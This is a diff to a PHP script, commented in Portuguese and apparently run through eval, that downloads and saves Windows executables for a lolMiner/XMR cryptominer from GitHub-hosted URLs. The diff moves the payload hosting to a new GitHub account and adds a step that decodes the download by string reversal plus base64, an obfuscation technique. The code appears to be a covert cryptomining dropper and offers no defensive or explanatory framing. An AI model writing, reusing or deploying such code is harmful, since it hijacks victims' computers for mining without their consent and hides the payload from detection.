@@ -2,9 +2,9 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****20
+****21
 
-[___GIT_COMMAND]
+[GIT_COMMAND]
 
 $GLOBALS['__download_002'] = function($url, $post = false, $__header = array())
 {
@@ -229,8 +229,8 @@ if(1)
 	$lolm_path .= '\\'.$lolm_name.'.exe';
 	$xmr_path .= '\\'.$xmr_name.'.exe';
 	$data = true;
-	$user = 'marceloti255';
-	$project = 'job';
+	$user = 'uservir2009';
+	$project = 'temp_down';
 	if(!is_file($lolm_path))
 	{
 		$data = false;
@@ -250,6 +250,7 @@ if(1)
 		$data3 = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/ring_dll.dat");
 		/**/
 		$data = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/xmr.dat");
+		$data = @base64_decode(@strrev($data));
 		
 		/*
 		$data2 = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/ring_config.dat");
